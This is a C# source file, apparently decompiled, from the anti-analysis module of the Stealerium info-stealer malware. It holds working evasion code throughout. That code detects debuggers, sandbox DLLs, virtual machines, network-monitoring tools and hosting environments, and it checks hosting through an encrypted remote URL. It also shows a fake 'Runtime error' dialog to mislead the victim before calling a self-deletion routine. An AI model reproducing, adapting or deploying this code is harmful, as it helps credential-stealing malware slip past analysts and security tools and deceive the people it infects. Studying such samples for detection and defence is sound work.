using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Modules.Implant;

internal sealed class AntiAnalysis
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	public static bool Debugger()
	{
		bool isDebuggerPresent = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			return isDebuggerPresent;
		}
		catch
		{
			return isDebuggerPresent;
		}
	}

	public static bool Emulator()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	public static bool Hosting()
	{
		try
		{
			return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[48]
			{
				145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
				49, 235, 197, 102, 94, 163, 45, 250, 10, 108,
				175, 221, 139, 165, 121, 24, 120, 162, 117, 164,
				206, 33, 157, 1, 101, 253, 223, 87, 30, 229,
				249, 102, 235, 195, 201, 170, 140, 162
			})).Contains("true");
		}
		catch
		{
		}
		return false;
	}

	public static bool Processes()
	{
		Process[] processes = Process.GetProcesses();
		string[] selectedProcessList = new string[8] { "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };
		return processes.Any((Process process) => selectedProcessList.Contains(process.ProcessName.ToLower()));
	}

	public static bool SandBox()
	{
		return new string[5] { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" }.Any((string dll) => GetModuleHandle(dll + ".dll").ToInt32() != 0);
	}

	public static bool VirtualBox()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		ManagementObjectEnumerator enumerator;
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if ((current.get_Item("Manufacturer").ToString()!.ToLower() == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || current.get_Item("Manufacturer").ToString()!.ToLower().Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementBaseObject current2 = enumerator.get_Current();
				if (current2.GetPropertyValue("Name").ToString()!.Contains("VMware") && current2.GetPropertyValue("Name").ToString()!.Contains("VBox"))
				{
					return true;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return false;
	}

	public static bool Run()
	{
		if (Config.AntiAnalysis != "1")
		{
			return false;
		}
		if (Hosting())
		{
			Logging.Log("AntiAnalysis : Hosting detected!");
		}
		if (Processes())
		{
			Logging.Log("AntiAnalysis : Process detected!");
		}
		if (VirtualBox())
		{
			Logging.Log("AntiAnalysis : Virtual machine detected!");
		}
		if (SandBox())
		{
			Logging.Log("AntiAnalysis : SandBox detected!");
		}
		if (Debugger())
		{
			Logging.Log("AntiAnalysis : Debugger detected!");
		}
		return false;
	}

	public static void FakeErrorMessage()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		string text = StringsCrypt.GenerateRandomData("1");
		text = "0x" + text.Substring(0, 5);
		Logging.Log("Sending fake error message box with code: " + text);
		MessageBox.Show("Exit code " + text, "Runtime error", (MessageBoxButtons)5, (MessageBoxIcon)16);
		SelfDestruct.Melt();
	}
}
